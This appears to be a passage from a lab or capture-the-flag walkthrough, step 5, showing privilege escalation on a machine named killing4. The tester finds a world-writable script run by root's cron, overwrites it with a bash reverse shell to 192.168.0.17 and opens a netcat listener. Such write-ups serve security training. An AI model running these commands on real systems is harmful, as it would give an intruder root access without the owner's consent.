⬆️ Step 5 — Privilege Escalation via Cron Job

After stabilizing our shell with Python (python3 -c 'import pty;pty.spawn("/bin/bash")'), post-exploitation enumeration was performed on common script directories, cron entries, and world-writable files in /opt.

💻 www-data@killing4: /opt — File Permissions Enumeration

www-data@killing4:/opt$ ls -la /opt/system_cleanup.sh
-rwxrwxrwx 1 root root 87 Nov 4 09:12 /opt/system_cleanup.sh
⚠️ CRITICAL system_cleanup.sh has 777 permissions!

Root cron job runs this every minute — Any user can overwrite this file!

Because the script is owned by root, scheduled to execute recurrently under root's crontab, and configured with full read/write/execute (rwxrwxrwx) permissions for all system users, we can replace its contents with a reverse root shell.

⚡ www-data@killing4: /opt — Cron Job Hijack & Listener
# Overwrite system_cleanup.sh with root reverse shell payload
www-data@killing4:/opt$ echo '#!/bin/bash' > /opt/system_cleanup.sh
www-data@killing4:/opt$ echo 'bash -i >& /dev/tcp/192.168.0.17/5555 0>&1' >> /opt/system_cleanup.sh
# On Kali Linux: Start second netcat listener on port 5555
(kali㉿kali)-[~]$ nc -lvnp 5555
